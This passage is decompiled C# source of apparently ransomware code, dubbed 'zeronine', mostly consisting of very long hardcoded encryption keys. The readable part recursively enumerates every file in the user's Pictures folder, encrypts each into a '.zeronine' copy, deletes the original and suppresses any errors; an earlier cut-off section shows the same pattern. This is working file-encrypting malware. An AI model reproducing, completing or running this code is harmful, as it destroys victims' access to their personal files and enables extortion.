6Em&Adc8FaP#4Xdoxw6FXbe@tdC&yil@gn!MM!XaBC3v7fe&tCCy16T$8sm5beJ%xVWQ50C58%EVHR4n8emwGVbj3%m@o!85!&7lrXB@AGz$!7wQX*661VyctMv8Nipg&I@jTS5KDTw9$fR5i5ep4bdGH$0fbCozyT7TEN6Fcv3h*yHn4zZqEAL$EWCX1ZiaE%jkh&0$88NIh5hRXMKKl&vyhCoqkINMN@DCP5G69#revDwIOtAOo7XGJTcFrJTZua4n!fb1GmkqORDeOgCzI*&oe%!$2BOyK!SuhiPirhIbvG01Q7Zkg2qvDoJ$mf8e*ugv*q%Fz@hAZ$27eaO4KDSqK5r29T5MiDDB9e28BttNUq%hvkzl0E34cYLc8dfG&$zW107Aho@ySe%@9jGX@sUeiI*K2ZA&ONpyZiP4MZElKEL&2rcx&qMNjVNs2wgRo5kFxgcz#kLDOi3e%BRKWkA6aCoE45CYsv%O2GIuPl#vfJ8B1iW0f%#E5NEv1*$7Ivs!loLZ!5#kpN0zDNluiKSW!!SobV3qp5NsyGYM&%8JbSwrVNSNvJY&D%As%%XfCm4t9ha%x8XlLJUieA2XcP4Ggpp@GFpaI2HXwDrnMvYWUMV@LzO5DAcVrXNs1HySSwdrC%UbqOLpZHU3#vqozT&hZUf8y8ve%GE&iD0OFMnxxv$KDsxFyj1*y$!QZulr1GsTDWtz4CjNfIsDy45fjqOVnFHmkKXsa5%RcLgP*7jwAN2qlx04YfhK16F7PHPtnZmjLbaNXpglg0VaMZBvS@34XuZFfiA0ryJjaSFKwmgi*$dAkeUYf2Bt5Ruyk4hOpP@QRL93tz*fVU5!Ry3BwKuYxxnr6P82F!!Sbvr9e0EO#$*KV@huaGzf3E!@&q%e1fA@2MZ4g#55fG#2yD5DHm1*bVY&3Ybw49Wx4FRJDMOGj#9wJ9d#U@6ONb1GW2BR2IBGsF7TuvA47UXgvbw#uHcBChk2mkVjk6mb@@ddBsi72bp!mUTueG%uf9dk#eGjAysBhvN2&s2b*EIa1ro!zaFea15@y!J%M*7DrOtzg0wuN#WB0DslYns9tOaPZTcFj%Y9GFRM&XU9Mszfe#CvI6g*o7rDNeaWXrkQeW4VUgOa2sWaX#K5Rp%mYzthvO*!w7k#IjBR9PBbrff$kRos#EeHu70nCv8fhVM#h!!n@!5bO4#StY6e9o7S@dijrvPmQ$35@kWrYBybIc2ZDI@mY#G!w3aEsR$gMSUsB7yJbno*y%KZKrGj@cwVYBI9KS8gFSxYqiYerTLkOHc0Sj@aLuNj$*#AyZ8roh2GHuiB@B0izMgq7qpAY7$sFO3rOxo1U2$gn5s6B1Hj#ESS1MbIj*@qlJB!1ZvEV9X7QAcb&S*6ZUYa$KzbWGRV9n#e40FkFDX#ptb0jAkzA5zztA%Q8tqoRb*cF&GGNW1W6#tki81v$zuDwDt##xlUuIMnV8Vl@emmED3youH9!#TzP4OCmlLxkGBxRGxjmo@zNI8tJ#OIQl!0xV7zTT*q2Xb&behi%&VMB@MH5#!r6DH*NjA5h7y@QL&YgBrEvfLsyoy4iz#Y0PtYpDs0eLa*H25Y$Wa4lw5z1XI*tevqDACa0IiDqz9kemL6SA9uZ9mDT@&1#Ug9xs4gz$7Wn6mUXtVOMLoTFB0dv*p7KQi5s9VuREGwClg@V!o8gSoSfW#w!0T!o9l&wQBX*a%hF1q237q#SQz1BZZ%F*@zTNhc9iFF00aGVgmnfB@3Jyi7It%6zerAHfw0sn@t!lD0ptF3MlZEe8Q#ej3oMhnviA*PSV#0HIb&vRRXOCtnnN4IY@vitnhT&QrPuyKzq*%%6Shv!FAjwAh4eZzy9UG@aqAf8bcY1@6oQ*kfu9QoN&%&IWk4*U05!D$oSbWZckr3c!NfOUd9E0ocUC6lzHzgCaWND5vslzlcoC#PiePmQ01aw2#Qek94tL1CFAcS7twmoMwrhQcu0mykIvZjBfnazQrDK!Kib6o%dnUKeLiXhNdguQ@rJ!q!fvv73Thof3T#7@g#BoFy6Z2mmkR3*18iovZQ1WQtd@Rn3ii1J8q#W1$o@JtSCNQn4KOkDyCn*tudIOSdbyt9KEVW0kWrC&rylDss#7xs%D5Cf0GOZQQM@qDZX1s1cTLaC$0e$9JdaacHIsQ9EI1uQF%4A24cn6QM04AKABsZgML!n5qEKsW31Zs%85eCegYdTyPmsG9DxBnd3EpdLZ14JvtBLDkd%quAwhhXPEUdsTeZLoc4oaZnO##&FObP45GHonpu5!wHeXkYq#Y5apX$zHU@mKSBCFIwm&K68Q*WmSizSFPKYfonHkQh@WIuive9oWLTs1%sRBrH7#jh#hL%y#pCpcdlImNZNik$@506i$%f2iJ*MAzBKIJUgJDQXtKEW1@YSnn*pnw#&jiH2F8IvMoF8ZxT2KiXU1SBPtP7u!t%toW%A5wSUCRjlwy!Y3Ffe8if0h0hYav3!SUTc!T%vZcrJIx14WI1vn0ufqF!EP@tPXq2cFy6jISO5z5rS9MC14Hn18Nuv0!g6rcuz$xY&LqN4lYouWJEc0!tpDBd1EKrplRmwj0Wkwepm@SoJ799RwEfZReW#U&@B8&S#l1k$V@oVlHWtu33EKA!hLWFFd2yZLoN59t&fxE$#xsnKRcIzDxZ*ekrxvf0@DYK%@zUB5wofE7S!i4WBT8vvxo0XbIsSMCz9IqQ0qH#PiT3G!ZP1rZiEcXhn9%8wE%@CgSs1N5TMEGmEut5L20Av@v6tic0tIgLMz18iGXNVG5A5Kd2OaW4M5gitu8rkE8E64am3UveENnP6VBJFJMsUl*psrnwgFcqg1cajZ83nRZ8RzL*tymB1oSt%T@kG8&8k%IeSa9OKrecV972GPcq!BY0IrEy%wWotzXuRgoTZ7zJKp*6VaEZ5pgJgq%a%JRv4Yr4kMK9aS03KPQ!sgd5s%sdTnnaKnwpPdnU7DuiyEymxM8zAdqYfVD*fnK6*jYv4KNGb5#pu#fOgfoHOwAG6*K3APOs2XKPoDRN8!xEJBDkpX098DRkJrY%ATfVQKw6Ty9dwBhV*5%549mlXOTYG9G%NuNovcw8NfzZXWl745lmV@BaG3&bZ7ztSDyCW29$I&rxIWwacV3KW2jtTmi!euIoofgU&JkC5pexKl1sf%*Edp&Z2FRJsgzvxcJCPCD2k1nGXuJhUyvhWEk*IQ!11BrxyRAHcYDd@F2lb0bg5jx3tS9T1K3*JLBjiypfube5VSOqL*%Qou5RMXdGrPP14e3qESDlK$u3e!hbErI2NmSXoS&tuJwFumaQx6M!$tfs9bMTpbC9HvNRuFCUurZBHPh11zmgFP&@g9XmGmETgX788r4s41GM3eLT3U!Yx430xtkVQxOhnG3sRi!i$@lNiU8CwEsuUO4l3GjOHiCGM*7wk!bt!S@4SpRdUi*Me@W9kRyk8NBv0faKvLz$C82bUA2NxG@*KYBsk*l@czunqgdMogQJRDKfAUnkxLv!tcLbEq9X9&!LmOtn5P*qYsQHO$sZtaezE23O4bh&H2jtK8!uaAoImeDaVEWi7Jd*!bgTtfS#haj%J56PD&Ytu5m9y22Zn89&Yk1I1ha#QtaM#GzyHHfATSm%xH#1M!PIBMH*EXw4%#Da$aFsbcSg@8Nf&$TtNiRXE1kR8!ussKdYPlawCkyjJiOC*baIEDQwMO%DYwTJq8Wr$Xyu#5RcsHO$miS&0MOp3PlaP&*OzP!ju%GKLonhUnEFAaZpEvrETgxolYf6&DlDOEJQChul*g4oLgaOHrjd&XyOH0*viqKRbBZ50JN%BffmLiDexzYo2hFzn#iKJ8cQ5mNKpEw7ENc1RMD7w@&r1$x3$8q%AcvbcxQ7$2XTD0KoFNib0kWpBtYaxTOqW0&b0ax2$FC#eNoAtiXqZPFYPfAr9piLNg6l3iXEYPGuI!kwFYpo$&zgVIuUaf@O5zQ&pDGkUs!KJspW4lmjA3pppyyUWDdSV0yRLmgCre#LeP6C17yX2SOCKAqzmuwRPixr3*LqFK149ELA!w2YmoZclwgk5pY6qM5$zOI@vISR0TCGxQ7y!*EaSVff1AUxu#NWhPiNO9CE5hk!UavOr9erh$MeICbVw#56fo7iHTK25AEKKNUzmfGVy4OMcEel7pQbLnVFcNH7xlVhzb3#qKIqXjgKaufDo*#PSC8%1PX9*h&NiguBjj4WH9NbgkeqhdSZqfYxc&CBvirPl2b@9e2edgIsx6YQkG1#xH%cR67Mh@a*Q&YnikqDknvj&FAFhuZPqwze%*LcGP6jGjCzHkh9YxsKUVFl62eVctq2GTqj8O%$qlDWDJ&%NZz!EpTj@9fNkKHV2iTw3&aj1X@ISrIW4hIl@xXZ9gQ9iStGEQ#3yjcPypapWL0Kzrrcb4!Et@wvpBBIDvdbwn&te2VMwHcXPfIZaqeJxyJ5vP9xo!MAHYWlt7&iioQMZ8gj!KhVR#m7eb7Y@&&44cQZS5fCs$aii%FWiY5EtzrMlxHrAIPkRuRwRQ0%eFCV3ExI5KpdB@KdTEN3xWCkPY0wnqF1799Ox%rhA*VY!LjxKndND6HqczGemB#OFXfB@$oWuf3yaMSdOcMAN0xa1Rl&yN4*EHTdFI4o*p!&cRpZhCyKx3aN9eiksR&hk4u@!O7GH6B68z7jBVYwwTjjGGda8s5pSTvh5W&@Esc0!DOIg8j&2JTztkvVK&gXBUnOEZnnX$SEqSqc1$@AJ*wiA5WtaLrGMnyHY9EQU$i6ZPib3s#oEGOc6eOIc@mMmM0c2jN10loNYzrTvuzqQDCf9WKTt$N0r5TNXfITFCX10amGv4Vqc$$JKUcf8@H$7w42ge$pMgLOojO*Jd&yJ%xvajDDcCtl#!3Dft9R8FE$TQ3afE%$5qVb*h!%B!NKV9TWPL2xEozE12cTPC6*fYPmf!E&!cpG03JT%gt#kHzpzRJfFhp*$OE6sgQwg$%B8TM7sSwIRcw*79VXr*!TvqkMylAYZ%WPKYqGFLVVtHQ!0f8Tt2eIDMOqI9Igr7rUoHwIRorglf8OarUTmpE61OM7K9&FcOdvY$msRZbFj&56NAQZnx3C3U@a4y7rRmd&ClyeFbbvn8W3rotjSHznUB2dClx1!sW6@*4BKLtMvgX#79rPFw9jVylasVc@mj#4LZATTS9gWn1Nm7FC3IVEsmKdV#qXI09lM2rh87$Vw2WH&7WUpA8Ewyk*o5&yBk7$OoBTo&D$M9pzZDGwg%hI14xvRT2caftl#02R6cFS6D0withlyJreDyDszOC$EA4gOE5*jXzdzxkxDam6LQm0WPiewi0rajn%ItIeXJbBrOnnnOPyBFswvdT84zka6IDpjnPS1hICOlIIB#zI2BQ$zzjeaij&7aEjL7d9*6&2%QIK$k7aACH$0hYsEkrS7kENh76cZ0j5Dw*jr8JYkJ6$@IrDit4wnO#UM#c6n4ji!k!dioBeB@HxnIt8P@3f5VRX2N6w%lKP8XDRpO#@syVUHfgEjDqUBEMG@dK4RmIYS1yyecSa*AVfA6QWg2N24YO4L6XlE8LGq6bopQ8HtpvaRGG%WWXx8o3@M#nhng%8xPXc4Bgy3GIncnmez1YQkvgCchCucz2mTWLbRDbup7#2Goz*QiqvRoXbiV9v*UWcm$3PCLvWyDaM1N5Wqde@JG$E*J!5DOv4k1okUk%Fv3%nOkJ4ZlF4p@@g9yQ!SzskpFBA*tbfg8gojQyWA6fzi1OR7Ik$3dV$ju7JJJ%Fj9wQVn6S9@!uU2bxZsCyJfLDMkFXSpmZaAQJd75TL15aLaKqsiSZgg5dwtdKiIASpbUtL1U!wrnqjk1laweJ&Ws3EMVS3ukD1MTJPZF0Xzcx!n3M21jUdZu@r0p8fb7Cgky6zR%jRmugT#BZriZCky8bzz0xjfuV!aqqx%uK$9cZeOiwyZQ%L5zqLwGAzhAL18nsmsBVwogLvI%LRd*TYxK%JAfaZUTW80*FaYKfx4i%xO#cz#rvipVDXRJMNa$C4sl$j0k!2!4#onH#fcJ5c&nre$qrP&!w8GBFc*29SZ3QU1wjKOgKz89&F@znJ2l$AH$iMb1gjJmMD6&mhghazq69gdAihnyZN*QN5n6IvAAQVv3h5NGCtkErK$CibS*5TW8epsQ@j8NZqPNTJ1m#HWFC37DalwgdBd68wx1l%M!u6NB#RR8jfEX%q%kRpPqV!jYmrn%UAa&44TeP6IS#x%76PaqzNJ5Q$f2WxwlDUnjeG@B&0$UH6v&$L1&R6fHZEQ8Yzqzi%PJKv@zV8T8rxxTII&L6Z3Gogsay3lGjELkQmWirBkSMGxbP%zp@f3SCJ#dc!a!vmYNMNc$UX@$Ok@IRRt2D$mdj!IHSSfyaS58QKxC@44el*d0PuuUhHxzAUdTe$Mbrd45o30g2r8hAh0LxQ066UR23e8$gE67r2vIDHlu3O1YIQZ13!$Xdoe&uCCj459xUByguShQefDr2!tmOgbOii#cXYvBFCz7ODdgzSGKTnS7lVE@RY$w3UPlGvS%5GLcOeDyXmV$a0##y%zCU@spGcE3W1aEAjONCpSgSneEc9WczUVj$pkCW$5laic%MR4zlQ1JmsSGxOmgPbDCFZIs*MZgTgGJLh1Ue5ZJ2M%L6emhrY5*fA0Vik19ZUYGmJ4Qv1bTk@i!@%v38Rx4kHdkpfl@dZShwZ*wJ%UZWlwl0*!lx7ah53$FFTAQPIPtjaeD7*Tc%7H*T0sRmAefykL@#2Ry5EKO%cbZ3YNZN&k7v%unArdoDJ#8YLIep#G!w2CQY2wwVn1!9Ng&HdYNa4kvhcBrpiJszSK3#Exg#P@YRC9kEk&le21!qPiv1FHmehBpDMDDorStbVeFcZNFL6O7zRln$boYhptJBSh1H36Vjgz4kDTb0bbH@cYUaxhmD@lub4EsRV7qA!wT0QD1RN7GnMp73vzrVTSQ#F@P8AsFdTgaoF3sUP4Y$fgxOfy44o4PigYVww2q3!C#FPSX2g6fx3Ux7EB@KXjxx00IPh5&WN4cdMS*vBCXRx0ouawSV9gfrNFnXKIUk9Sk*rtuUCGiVVG99LvoTmkWGYtZHEKl2QMrfpQDPb&T27s%gFOlw2a&x$eJ7#nQ13PFiX3s4S8ro0#hFwsCy7X9Po3jkgFuwQ!8rnWrk4qe3rr6B%djklz@FPY3#TIwNm#**4y0aaz4psf6%%InD$jkZ*@Cx@wzv@zpws7GgMJjU$muj167k3trDsIABwCgM9IW2Yim7CHZuAy#uh1%5Yo2iImEk7esjC6UWy2USTAiV3%c@NO@$FKwToNtLeb96XpscEH$OgNlYGGOLjk6SLwE0JaHLIinRAl7NmAxGsOx1*7Ni8Ib3EQuAL!2D9sG&9#x3IB*JVz8%8M2LW*M9HtmsZ&CtHUGAhz1EiTa7J1HNqxB*9qpBGGZoQFDK*NCaT8xItXCc7OZPM9bb%DUZEF@bAMWdpy85YG@rA2NkOmD1pKCqdbN4!l%nFvhhB7vho#ZGfSBdyjkzCbuyjf9nLdDmjoMNUFJQz4lVt5ktAjFraFlDaR7$*I5kzM5zfwSTa#Agy9FN#oNb*tMecJMcHnrR8a4HAtnl0uRGeeNBMTaS#3MfA0w%kplVlrhxe&NjaBKmcf97$LyWm8wewxHI%qBKi$#v6Y5oGzr2s9D30yB9ZxIm4capyFmSA9EHLmBGoKQvp#uXuNQgpbtTvq13XPYam82s$$RNX4TohV%AQM4lXGc*oTt#ugr8uPiqbb!y$cruqelAt0MkUMMg5#EkKW!qMt31mO*OTeQUwqQjhtJ#3gniDbUg&qOhKaI%KtWF2&zP50SON3DZm&WFGUXk30qcZIKvIT8w&Eb5P7MlSG@DnX#MNDZy5LLBpXywQ5f@#o2i50Yhhl!w7NxbN&iF@J0u!AP0hY$vA9I*$upVNRqTsXDC9XJSWa9UXHQ$L79SQfW7eyf!Qv0k1gCE6m1Tol98AwjXEUKPR*Dmae6jRqbAiX2Qel*7fPDEGX7qoRw5lL2@dxd1pRC7K8ZL#@S1vMJC$8gMgP#93FX&$9mpIGRXNe3g&VvV8$J8bz&eqztAWCdek!p4PcsP4UxZeAOU2ha75x$ECI*RuqBkBY$Ff1f5l@EQbg9ql9HOBFIv%L2HEB#mTmYPEiOBbeVCTOC4iQFujVJ$piI#8*1K8z6xRsMcUfm%sGCRi&*W5ID&D38$ATCcmLc@RNmYECadimLjgzUBAEOzw8UwtqCaDjshDi94tiS@h8xZRYxJ8BcI6lFS2YeW99A*@dg&zypzUUrxj#f4!2bCHKkzDQC$E5@h*y6NrzritLwL@QI*SJ#g770S2P#jwUvx1KyT&1MbK2R$W86vIDl4bvja7nUC%IU8x*TSzXB0625eP5$@rhbti1WFAYusgjeC", "M6yaS6B&");
				FileSystem.Kill(fileInfo2.FullName);
				if (fullName2.Contains("zeranine.exe"))
				{
					FileSystem.Kill(fullName2 + ".zeronine");
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
		DirectoryInfo directoryInfo3 = new DirectoryInfo(folderPath3);
		FileInfo[] files3 = directoryInfo3.GetFiles("*.*", SearchOption.AllDirectories);
		FileInfo[] array3 = files3;
		foreach (FileInfo fileInfo3 in array3)
		{
			string fullName3 = fileInfo3.FullName;
			try
			{
				EncryptFile(fullName3, fullName3 + ".zeronine", "URJOtBT9U8kuYp5EU%lROswqHxPu*Qe#3zd#NR9H3MQaKvq7DqvJwcyb3!g5u*BE3Q17lBzD6EXCCWgUHqRq#$GzBCAUKDu4kMG@4SuCzSlsnw8guVXdpTJ*ja%jaF!@r2zypmyX5PZLSWMND29XORO0DhS3VLBUZrau%Jzh59ha@7oWXSgHfEnan8VI35CTnFUAVzQ@C0!oJN7F!5fDe@oVEAg&WRnA&wVXMOB6bmFnL8zABQP7y8oUy*5VssGtm1qu0J!m#iB0XaKeig5GbPK*IB7nSOmRgtBTqFi1XcDp&w%YX0MMW9r6qSmZkn#o5StD8zWd&ER8M3atEiZ0CA#gCEC*!SpjhXtnD@y&EiOSqStWR!uCwDm$Xma#XxLOXh0XJvqkS!W2ULysTOp96NVeKxyy!$iP&A4i15N$Kjs4PtKMwqKihLqjVVNt%0SwsH4UQp0XatxW#zxyNmCKt9HVrtWFR@8sz5LIYy5gyvIwv#P46wGsxhcsAic52ufHuF%*OpaXq$t70s9we!I3vP#r2!Ipv9NEQabQ7qPQWrC@We1pJO0amLUfkNFvHTBqqpqzRrywl0gEma4XA!ghImzeP5fTL@iDQtlgwB*zYdxVeQ!jrqvom@iEylKulFLrRDW2xXA*@PSEXeA*D5b3G@ZwLhQLZMOs1fdB@9U#QXV6KEPUllRpdqLXm9QQHxhQB8lra*FdKHMrH2Mg158n#7oj3oX@rEv!Pe5k16TNGNF%e2QTvjxLY@VcsbXUjLuGttcc6bO#LuHQ2SFa*dghokcvS@0yi*D4!8lTZnWU4#9duFja%WvfEm0iRpsdKxuMrMX3guKtQumUL8amsz@ul6ZOHcCj#sKfIWUiQP3KMCxSAG&roftT4AaUViVdSAy&kglXN0%D%SIJhHOBFs#X*zkIv9Wh3y0ll0H@3iewJQWl0zmn3t79fb*t5dbNEXiG05&QAuH5OGnRD*Q$vINJ11GK!W&ZHzsuhpU4@5nImbt8WQQ6vfz$K9O8yvxmXqxwW2JWmVCZ#e%yggwkfADB9wKIBuFGHBt$m6l3H@TaDaBFDY1r*mgXNWw8rBu0p5r@talj#3dlpc78vFFl3vH#35qyJmLGH!THRHtCMRweJ#hkYXlM$J&3XX9XSvaqR&EwrZqotc8l*Ct9XGAUa*K7#ZS@h%SZqGvlyT!*g6!2Ku4udA9MVoQsWG@!HwgXsi4!PIJEnBnDfqwI46yh%GdbYDYSZ90SyEibzcf4Z$*tBmmFSt&j780Me2clsZNnj4NbIVR!0#qBhsalysAfCqtzM5%&9@LAqTKf9k66CeSdqZEu!Zv9ZhL!KvYlYT2&rqsXI#MnvDD6*QiV0kFigLjihR$MVthrlUUAgpM&NhmWeO33NDtNOsZgHKPZ8A!b4UUm$iok*H$8*WE@Xb8rA3D24n!5AV*Nok1T@p7EXJogXzhtfvC&BJbBq!RqpSKMiRTW4tAHD##zO%EEfhZNsaMFJZcB*pwe*C7GgUYuv43GoKVUwNkI2%2henmEq*ivGy1l776UrE0xGfZ8EqmtFOlCJyB2HtdwVgAYSJvYQZZxedb8wnAAuXq0mYcI6Em&Adc8FaP#4Xdoxw6FXbe@tdC&yil@gn!MM!XaBC3v7fe&tCCy16T$8sm5beJ%xVWQ50C58%EVHR4n8emwGVbj3%m@o!85!&7lrXB@AGz$!7wQX*661VyctMv8Nipg&I@jTS5KDTw9$fR5i5ep4bdGH$0fbCozyT7TEN6Fcv3h*yHn4zZqEAL$EWCX1ZiaE%jkh&0$88NIh5hRXMKKl&vyhCoqkINMN@DCP5G69#revDwIOtAOo7XGJTcFrJTZua4n!fb1GmkqORDeOgCzI*&oe%!$2BOyK!SuhiPirhIbvG01Q7Zkg2qvDoJ$mf8e*ugv*q%Fz@hAZ$27eaO4KDSqK5r29T5MiDDB9e28BttNUq%hvkzl0E34cYLc8dfG&$zW107Aho@ySe%@9jGX@sUeiI*K2ZA&ONpyZiP4MZElKEL&2rcx&qMNjVNs2wgRo5kFxgcz#kLDOi3e%BRKWkA6aCoE45CYsv%O2GIuPl#vfJ8B1iW0f%#E5NEv1*$7Ivs!loLZ!5#kpN0zDNluiKSW!!SobV3qp5NsyGYM&%8JbSwrVNSNvJY&D%As%%XfCm4t9ha%x8XlLJUieA2XcP4Ggpp@GFpaI2HXwDrnMvYWUMV@LzO5DAcVrXNs1HySSwdrC%UbqOLpZHU3#vqozT&hZUf8y8ve%GE&iD0OFMnxxv$KDsxFyj1*y$!QZulr1GsTDWtz4CjNfIsDy45fjqOVnFHmkKXsa5%RcLgP*7jwAN2qlx04YfhK16F7PHPtnZmjLbaNXpglg0VaMZBvS@34XuZFfiA0ryJjaSFKwmgi*$dAkeUYf2Bt5Ruyk4hOpP@QRL93tz*fVU5!Ry3BwKuYxxnr6P82F!!Sbvr9e0EO#$*KV@huaGzf3E!@&q%e1fA@2MZ4g#55fG#2yD5DHm1*bVY&3Ybw49Wx4FRJDMOGj#9wJ9d#U@6ONb1GW2BR2IBGsF7TuvA47UXgvbw#uHcBChk2mkVjk6mb@@ddBsi72bp!mUTueG%uf9dk#eGjAysBhvN2&s2b*EIa1ro!zaFea15@y!J%M*7DrOtzg0wuN#WB0DslYns9tOaPZTcFj%Y9GFRM&XU9Mszfe#CvI6g*o7rDNeaWXrkQeW4VUgOa2sWaX#K5Rp%mYzthvO*!w7k#IjBR9PBbrff$kRos#EeHu70nCv8fhVM#h!!n@!5bO4#StY6e9o7S@dijrvPmQ$35@kWrYBybIc2ZDI@mY#G!w3aEsR$gMSUsB7yJbno*y%KZKrGj@cwVYBI9KS8gFSxYqiYerTLkOHc0Sj@aLuNj$*#AyZ8roh2GHuiB@B0izMgq7qpAY7$sFO3rOxo1U2$gn5s6B1Hj#ESS1MbIj*@qlJB!1ZvEV9X7QAcb&S*6ZUYa$KzbWGRV9n#e40FkFDX#ptb0jAkzA5zztA%Q8tqoRb*cF&GGNW1W6#tki81v$zuDwDt##xlUuIMnV8Vl@emmED3youH9!#TzP4OCmlLxkGBxRGxjmo@zNI8tJ#OIQl!0xV7zTT*q2Xb&behi%&VMB@MH5#!r6DH*NjA5h7y@QL&YgBrEvfLsyoy4iz#Y0PtYpDs0eLa*H25Y$Wa4lw5z1XI*tevqDACa0IiDqz9kemL6SA9uZ9mDT@&1#Ug9xs4gz$7Wn6mUXtVOMLoTFB0dv*p7KQi5s9VuREGwClg@V!o8gSoSfW#w!0T!o9l&wQBX*a%hF1q237q#SQz1BZZ%F*@zTNhc9iFF00aGVgmnfB@3Jyi7It%6zerAHfw0sn@t!lD0ptF3MlZEe8Q#ej3oMhnviA*PSV#0HIb&vRRXOCtnnN4IY@vitnhT&QrPuyKzq*%%6Shv!FAjwAh4eZzy9UG@aqAf8bcY1@6oQ*kfu9QoN&%&IWk4*U05!D$oSbWZckr3c!NfOUd9E0ocUC6lzHzgCaWND5vslzlcoC#PiePmQ01aw2#Qek94tL1CFAcS7twmoMwrhQcu0mykIvZjBfnazQrDK!Kib6o%dnUKeLiXhNdguQ@rJ!q!fvv73Thof3T#7@g#BoFy6Z2mmkR3*18iovZQ1WQtd@Rn3ii1J8q#W1$o@JtSCNQn4KOkDyCn*tudIOSdbyt9KEVW0kWrC&rylDss#7xs%D5Cf0GOZQQM@qDZX1s1cTLaC$0e$9JdaacHIsQ9EI1uQF%4A24cn6QM04AKABsZgML!n5qEKsW31Zs%85eCegYdTyPmsG9DxBnd3EpdLZ14JvtBLDkd%quAwhhXPEUdsTeZLoc4oaZnO##&FObP45GHonpu5!wHeXkYq#Y5apX$zHU@mKSBCFIwm&K68Q*WmSizSFPKYfonHkQh@WIuive9oWLTs1%sRBrH7#jh#hL%y#pCpcdlImNZNik$@506i$%f2iJ*MAzBKIJUgJDQXtKEW1@YSnn*pnw#&jiH2F8IvMoF8ZxT2KiXU1SBPtP7u!t%toW%A5wSUCRjlwy!Y3Ffe8if0h0hYav3!SUTc!T%vZcrJIx14WI1vn0ufqF!EP@tPXq2cFy6jISO5z5rS9MC14Hn18Nuv0!g6rcuz$xY&LqN4lYouWJEc0!tpDBd1EKrplRmwj0Wkwepm@SoJ799RwEfZReW#U&@B8&S#l1k$V@oVlHWtu33EKA!hLWFFd2yZLoN59t&fxE$#xsnKRcIzDxZ*ekrxvf0@DYK%@zUB5wofE7S!i4WBT8vvxo0XbIsSMCz9IqQ0qH#PiT3G!ZP1rZiEcXhn9%8wE%@CgSs1N5TMEGmEut5L20Av@v6tic0tIgLMz18iGXNVG5A5Kd2OaW4M5gitu8rkE8E64am3UveENnP6VBJFJMsUl*psrnwgFcqg1cajZ83nRZ8RzL*tymB1oSt%T@kG8&8k%IeSa9OKrecV972GPcq!BY0IrEy%wWotzXuRgoTZ7zJKp*6VaEZ5pgJgq%a%JRv4Yr4kMK9aS03KPQ!sgd5s%sdTnnaKnwpPdnU7DuiyEymxM8zAdqYfVD*fnK6*jYv4KNGb5#pu#fOgfoHOwAG6*K3APOs2XKPoDRN8!xEJBDkpX098DRkJrY%ATfVQKw6Ty9dwBhV*5%549mlXOTYG9G%NuNovcw8NfzZXWl745lmV@BaG3&bZ7ztSDyCW29$I&rxIWwacV3KW2jtTmi!euIoofgU&JkC5pexKl1sf%*Edp&Z2FRJsgzvxcJCPCD2k1nGXuJhUyvhWEk*IQ!11BrxyRAHcYDd@F2lb0bg5jx3tS9T1K3*JLBjiypfube5VSOqL*%Qou5RMXdGrPP14e3qESDlK$u3e!hbErI2NmSXoS&tuJwFumaQx6M!$tfs9bMTpbC9HvNRuFCUurZBHPh11zmgFP&@g9XmGmETgX788r4s41GM3eLT3U!Yx430xtkVQxOhnG3sRi!i$@lNiU8CwEsuUO4l3GjOHiCGM*7wk!bt!S@4SpRdUi*Me@W9kRyk8NBv0faKvLz$C82bUA2NxG@*KYBsk*l@czunqgdMogQJRDKfAUnkxLv!tcLbEq9X9&!LmOtn5P*qYsQHO$sZtaezE23O4bh&H2jtK8!uaAoImeDaVEWi7Jd*!bgTtfS#haj%J56PD&Ytu5m9y22Zn89&Yk1I1ha#QtaM#GzyHHfATSm%xH#1M!PIBMH*EXw4%#Da$aFsbcSg@8Nf&$TtNiRXE1kR8!ussKdYPlawCkyjJiOC*baIEDQwMO%DYwTJq8Wr$Xyu#5RcsHO$miS&0MOp3PlaP&*OzP!ju%GKLonhUnEFAaZpEvrETgxolYf6&DlDOEJQChul*g4oLgaOHrjd&XyOH0*viqKRbBZ50JN%BffmLiDexzYo2hFzn#iKJ8cQ5mNKpEw7ENc1RMD7w@&r1$x3$8q%AcvbcxQ7$2XTD0KoFNib0kWpBtYaxTOqW0&b0ax2$FC#eNoAtiXqZPFYPfAr9piLNg6l3iXEYPGuI!kwFYpo$&zgVIuUaf@O5zQ&pDGkUs!KJspW4lmjA3pppyyUWDdSV0yRLmgCre#LeP6C17yX2SOCKAqzmuwRPixr3*LqFK149ELA!w2YmoZclwgk5pY6qM5$zOI@vISR0TCGxQ7y!*EaSVff1AUxu#NWhPiNO9CE5hk!UavOr9erh$MeICbVw#56fo7iHTK25AEKKNUzmfGVy4OMcEel7pQbLnVFcNH7xlVhzb3#qKIqXjgKaufDo*#PSC8%1PX9*h&NiguBjj4WH9NbgkeqhdSZqfYxc&CBvirPl2b@9e2edgIsx6YQkG1#xH%cR67Mh@a*Q&YnikqDknvj&FAFhuZPqwze%*LcGP6jGjCzHkh9YxsKUVFl62eVctq2GTqj8O%$qlDWDJ&%NZz!EpTj@9fNkKHV2iTw3&aj1X@ISrIW4hIl@xXZ9gQ9iStGEQ#3yjcPypapWL0Kzrrcb4!Et@wvpBBIDvdbwn&te2VMwHcXPfIZaqeJxyJ5vP9xo!MAHYWlt7&iioQMZ8gj!KhVR#m7eb7Y@&&44cQZS5fCs$aii%FWiY5EtzrMlxHrAIPkRuRwRQ0%eFCV3ExI5KpdB@KdTEN3xWCkPY0wnqF1799Ox%rhA*VY!LjxKndND6HqczGemB#OFXfB@$oWuf3yaMSdOcMAN0xa1Rl&yN4*EHTdFI4o*p!&cRpZhCyKx3aN9eiksR&hk4u@!O7GH6B68z7jBVYwwTjjGGda8s5pSTvh5W&@Esc0!DOIg8j&2JTztkvVK&gXBUnOEZnnX$SEqSqc1$@AJ*wiA5WtaLrGMnyHY9EQU$i6ZPib3s#oEGOc6eOIc@mMmM0c2jN10loNYzrTvuzqQDCf9WKTt$N0r5TNXfITFCX10amGv4Vqc$$JKUcf8@H$7w42ge$pMgLOojO*Jd&yJ%xvajDDcCtl#!3Dft9R8FE$TQ3afE%$5qVb*h!%B!NKV9TWPL2xEozE12cTPC6*fYPmf!E&!cpG03JT%gt#kHzpzRJfFhp*$OE6sgQwg$%B8TM7sSwIRcw*79VXr*!TvqkMylAYZ%WPKYqGFLVVtHQ!0f8Tt2eIDMOqI9Igr7rUoHwIRorglf8OarUTmpE61OM7K9&FcOdvY$msRZbFj&56NAQZnx3C3U@a4y7rRmd&ClyeFbbvn8W3rotjSHznUB2dClx1!sW6@*4BKLtMvgX#79rPFw9jVylasVc@mj#4LZATTS9gW